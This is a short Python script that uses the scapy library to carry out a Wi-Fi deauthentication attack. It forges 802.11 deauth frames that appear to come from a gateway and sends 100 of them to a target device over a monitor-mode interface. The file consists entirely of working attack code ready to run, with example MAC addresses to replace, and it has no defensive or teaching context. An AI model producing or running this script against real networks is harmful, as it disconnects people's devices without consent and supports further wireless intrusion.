from scapy.all import *

def deauth_attack(target_mac, gateway_mac, iface):
    # Deauth packet from the gateway to the target
    packet = RadioTap() / \
             Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / \
             Dot11Deauth(reason=7)
    print(f"Sending deauth packets to {target_mac} from {gateway_mac}")
    
    sendp(packet, iface=iface, count=100, inter=0.1, verbose=1)

# Example usage
target_mac = "ec:5c:68:4a:db:33"  # Replace with the target MAC address
gateway_mac = "f4:c1:14:f8:ec:b3"  # Replace with the gateway MAC address
iface = "wlan0mon"  # Replace with your monitor mode interface

deauth_attack(target_mac, gateway_mac, iface)
